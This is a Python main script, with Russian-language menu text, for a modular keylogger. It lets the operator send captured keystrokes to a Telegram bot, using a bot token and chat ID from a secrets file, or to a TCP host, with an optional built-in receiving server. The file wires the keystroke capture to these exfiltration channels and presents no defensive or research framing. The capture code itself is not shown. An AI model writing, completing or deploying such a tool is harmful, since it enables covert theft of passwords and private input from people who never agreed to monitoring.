from output import TelegramOutput, TCPOutput
from core import Keylogger
from core.formatters import TelegramFormatter, TCPFormatter
from server import KeyloggerServer
from config.secrets import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TCP_PORT, TCP_HOST
import time

def start_telegram_mode():
    """Режим работы с Telegram"""
    output = TelegramOutput(
        token=TELEGRAM_BOT_TOKEN,
        chat_id=TELEGRAM_CHAT_ID
    )
    formatter = TelegramFormatter()
    return Keylogger(callback=output.send, formatter=formatter) 

def start_tcp_mode(server_mode=False):
    """Режим работы в TCP"""
    if server_mode:
        server = KeyloggerServer(TCP_HOST, TCP_PORT)
        server.start()
    
    output = TCPOutput(TCP_HOST, TCP_PORT)
    formatter = TCPFormatter()
    return Keylogger(callback=output.send, formatter=formatter)

def main():
    print("Выберите режим работы:")
    print("1 - Telegram")
    print("2 - TCP (клиент)")
    print("3 - TCP (сервер + клиент)")
    
    choice = input("Ваш выбор (1/2/3): ").strip()

    if choice == "1":
        logger = start_telegram_mode()
    elif choice == "2":
        logger = start_tcp_mode(server_mode=False)
    elif choice == "3":
        logger = start_tcp_mode(server_mode=True)
    else:
        print("Неверный выбор")
        return

    print("Кейлоггер запущен (Ctrl+C для остановки)")
    logger.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.stop()
        print("Kейлоггер остановлен")
    
if __name__ == "__main__":
    main()